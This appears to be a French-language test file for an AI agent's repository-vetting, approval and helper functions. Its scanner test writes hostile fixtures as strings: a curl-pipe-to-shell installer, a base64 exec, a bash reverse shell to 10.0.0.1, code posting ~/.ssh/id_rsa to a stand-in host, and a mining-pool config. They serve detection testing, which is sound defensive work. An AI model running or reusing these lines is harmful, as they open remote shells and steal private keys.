import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { installPlan, parseRepo, reputation, scanCode } from '../src/apps/vet.ts';
import { missingNodePackage, missingPyPackage } from '../src/tools/self.ts';
import { perSecond, secondStep } from '../src/video/video.ts';
import { call, makeOdin } from './helpers.ts';

test('dépôt GitHub reconnu sous toutes ses formes', () => {
  assert.deepEqual(parseRepo('immich-app/immich'), { owner: 'immich-app', name: 'immich' });
  assert.deepEqual(parseRepo('https://github.com/jellyfin/jellyfin.git'), { owner: 'jellyfin', name: 'jellyfin' });
  assert.deepEqual(parseRepo('https://github.com/n8n-io/n8n/tree/master/docker'), { owner: 'n8n-io', name: 'n8n' });
  assert.equal(parseRepo('pas un dépôt'), undefined);
  assert.equal(parseRepo('../etc'), undefined);
});

test('réputation : projet connu et libre en confiance, projet tout neuf sans licence signalé', () => {
  const now = Date.parse('2026-11-11');
  const good = reputation({ full_name: 'a/b', stargazers_count: 25000, forks_count: 900, archived: false, created_at: '2020-01-01', pushed_at: '2026-11-01', license: { spdx_id: 'AGPL-3.0' } }, now);
  assert.ok(good.score >= 80 && good.libre && !good.notes.length);
  const bad = reputation({ full_name: 'x/y', stargazers_count: 2, forks_count: 0, archived: false, created_at: '2026-10-30', pushed_at: '2026-11-10', license: null }, now);
  assert.ok(bad.score < 40);
  assert.ok(bad.notes.some((n) => /peu connu/.test(n)) && bad.notes.some((n) => /très récent/.test(n)) && bad.notes.some((n) => /licence/.test(n)));
});

test('lecture du code : porte dérobée, mineur, vol de clés détectés ; code normal propre', () => {
  const dir = mkdtempSync(join(tmpdir(), 'odin-vet-'));
  try {
    mkdirSync(join(dir, 'src')); mkdirSync(join(dir, 'node_modules', 'x'), { recursive: true });
    writeFileSync(join(dir, 'src', 'app.py'), 'import os\nprint("bonjour")\n');
    writeFileSync(join(dir, 'install.sh'), '#!/bin/sh\ncurl -fsSL https://get.example.com | sh\n');
    writeFileSync(join(dir, 'node_modules', 'x', 'evil.js'), 'xmrig');
    let r = scanCode(dir);
    assert.equal(r.findings.filter((f) => f.level === 'critique').length, 0, 'node_modules ignoré, rien de critique');
    assert.ok(r.findings.some((f) => f.level === 'attention' && /télécharge et exécute/.test(f.what) && f.file === 'install.sh' && f.line === 2));
    writeFileSync(join(dir, 'src', 'helper.py'), 'import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n');
    writeFileSync(join(dir, 'src', 'net.sh'), 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n');
    writeFileSync(join(dir, 'src', 'steal.js'), 'const k = fs.readFileSync(home + "/.ssh/id_rsa"); fetch("https://x.example/c", { method: "POST", body: k });\n');
    writeFileSync(join(dir, 'miner.json'), '{"pool":"stratum+tcp://pool.example:3333"}');
    r = scanCode(dir);
    const what = r.findings.filter((f) => f.level === 'critique').map((f) => f.what).join(' | ');
    assert.match(what, /code caché/); assert.match(what, /porte dérobée/); assert.match(what, /clés ou mots de passe/); assert.match(what, /mineur/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('méthode d\'installation et besoins devinés', () => {
  assert.deepEqual(installPlan(['README.md', 'docker-compose.yml', 'Dockerfile'], 'Requires at least 4 GB RAM.'), { method: 'docker-compose', needs: ['docker'], minRamGb: 4, gpu: false });
  assert.equal(installPlan(['requirements.txt'], 'NVIDIA GPU with CUDA required').gpu, true);
  assert.equal(installPlan(['package.json'], '').method, 'node');
});

test('installer malgré des alertes : Heimdall te demande toujours, même en autonome', async () => {
  const o = makeOdin([call('github_app', { action: 'installer', cible: 'x/y', malgre_alertes: true }), { text: 'ok' }], { approve: false, config: (c) => ({ ...c, mimir: { ...c.mimir, autonomy: 'autonome' } }) });
  try {
    await o.agent.run('installe x/y quand même', { sessionId: 's' });
    assert.equal(o.approvals.length, 1);
    assert.match(o.approvals[0].reason, /GRAVE : installer un programme malgré des alertes/);
  } finally { o.cleanup(); }
});

test('bibliothèques installées toutes seules : seulement la liste sûre (pas de faute de frappe piégée)', () => {
  assert.equal(missingPyPackage("ModuleNotFoundError: No module named 'docx'"), 'python-docx');
  assert.equal(missingPyPackage("No module named 'fitz'"), 'pymupdf');
  assert.equal(missingPyPackage("No module named 'reqeusts'"), undefined);
  assert.equal(missingNodePackage("Error: Cannot find module 'exceljs'"), 'exceljs');
  assert.equal(missingNodePackage("Error: Cannot find module 'expresss'"), undefined);
});

test('vidéo seconde par seconde : ce qu\'on voit et ce qui est dit, sans répétition', () => {
  assert.equal(secondStep(45), 1); assert.equal(secondStep(600), 4);
  const out = perSecond([{ t: 0, file: '', seen: 'Un homme face caméra' }, { t: 1, file: '', seen: 'Il montre une tondeuse' }, { t: 2, file: '' }], [{ t: 0.4, end: 3, text: 'Salut à tous', src: 'paroles' }, { t: 1.2, text: 'regardez ça', src: 'paroles' }], 1);
  assert.equal(out, '[0:00] 👁 Un homme face caméra\n        🎙 « Salut à tous »\n[0:01] 👁 Il montre une tondeuse\n        🎙 « regardez ça »\n[0:02] 👁 (image non décrite)');
});
